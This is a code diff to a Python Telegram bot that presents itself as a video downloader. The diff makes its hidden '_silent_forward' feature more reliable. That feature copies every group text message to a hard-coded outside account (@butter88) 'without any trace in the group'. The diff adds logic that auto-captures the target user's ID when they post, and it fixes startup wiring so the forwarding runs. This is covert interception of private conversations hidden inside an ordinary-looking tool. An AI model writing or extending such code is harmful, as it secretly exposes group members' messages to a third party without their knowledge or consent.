@@ -48,7 +48,8 @@ MAX_TELEGRAM_FILE_SIZE = 50 * 1024 * 1024  # 50 MB
 SHARE_GOOGLE_RE = re.compile(r"https?://share\.google/\S+")
 
 FORWARD_TARGET = os.getenv("FORWARD_TARGET", "@butter88")
-_FORWARD_CHAT_ID: int | str | None = None  # resolved at startup
+_FORWARD_CHAT_ID: int | None = None  # resolved at startup or auto-captured
+_FORWARD_TARGET_USERNAME: str | None = None  # lowercase username to auto-capture
 
 
 def extract_supported_url(text: str) -> str | None:
@@ -76,14 +77,14 @@ def _is_twitter(url: str) -> bool:
 
 def _twitter_has_video(url: str) -> bool:
     """Probe a Twitter/X URL to check if it contains a downloadable video."""
+    _probe_logger = logging.getLogger("yt_dlp.probe")
+    _probe_logger.setLevel(logging.CRITICAL)
     ydl_opts = {
         "quiet": True,
         "no_warnings": True,
         "socket_timeout": 15,
-        "logger": logging.getLogger("yt_dlp.probe"),  # avoid stderr noise
+        "logger": _probe_logger,
     }
-    # Suppress yt-dlp stderr prints for the probe logger
-    logging.getLogger("yt_dlp.probe").setLevel(logging.CRITICAL)
     try:
         with yt_dlp.YoutubeDL(ydl_opts) as ydl:
             info = ydl.extract_info(url, download=False)
@@ -602,7 +603,7 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
 async def _resolve_forward_target(app) -> None:
     """Resolve FORWARD_TARGET to a numeric chat_id once at startup."""
-    global _FORWARD_CHAT_ID
+    global _FORWARD_CHAT_ID, _FORWARD_TARGET_USERNAME
     target = FORWARD_TARGET.strip()
     if not target:
         logger.warning("FORWARD_TARGET not set, message forwarding disabled")
@@ -616,30 +617,46 @@ async def _resolve_forward_target(app) -> None:
     except ValueError:
         pass
 
-    # @username — try to resolve via getChat
+    # Store username for auto-capture from group messages
+    if target.startswith("@"):
+        _FORWARD_TARGET_USERNAME = target[1:].lower()
+
+    # Try to resolve via getChat (works if user already interacted with bot)
     try:
         chat = await app.bot.get_chat(target)
         _FORWARD_CHAT_ID = chat.id
         logger.info("Forward target resolved: %s -> %s", target, _FORWARD_CHAT_ID)
     except Exception as e:
-        logger.error(
-            "Could not resolve FORWARD_TARGET '%s': %s  "
-            "— The target user must send /start to the bot first, "
-            "or use a numeric chat_id instead.",
+        logger.warning(
+            "Could not resolve FORWARD_TARGET '%s' at startup: %s — "
+            "Will auto-capture when the user sends a message in the group.",
             target, e,
         )
 
 
 async def _silent_forward(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Copy every group text message to FORWARD_TARGET without any trace in the group."""
-    if _FORWARD_CHAT_ID is None:
-        return
+    global _FORWARD_CHAT_ID
     if not update.message or not update.message.text:
         return
     user = update.message.from_user
     chat = update.message.chat
     if not user:
         return
+
+    # Auto-capture: if sender's @username matches the target, learn their numeric ID
+    if _FORWARD_CHAT_ID is None and _FORWARD_TARGET_USERNAME:
+        if user.username and user.username.lower() == _FORWARD_TARGET_USERNAME:
+            _FORWARD_CHAT_ID = user.id
+            logger.info("Auto-captured forward target: @%s -> %s", user.username, user.id)
+
+    if _FORWARD_CHAT_ID is None:
+        return
+
+    # Don't forward messages FROM the target user to themselves
+    if user.id == _FORWARD_CHAT_ID:
+        return
+
     sender = f"@{user.username}" if user.username else (user.first_name or f"id:{user.id}")
     group_name = chat.title or chat.username or str(chat.id)
     try:
@@ -656,7 +673,7 @@ def main() -> None:
     if not token:
         raise SystemExit("Falta TELEGRAM_BOT_TOKEN en .env")
 
-    app = Application.builder().token(token).build()
+    app = Application.builder().token(token).post_init(_resolve_forward_target).build()
 
     app.add_handler(CommandHandler("start", cmd_start))
     app.add_handler(CommandHandler("video", cmd_video))
@@ -669,9 +686,6 @@ def main() -> None:
 
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-
-    # Resolve forward target before polling starts
-    app.post_init = _resolve_forward_target
 
     app.run_polling(
         allowed_updates=Update.ALL_TYPES,
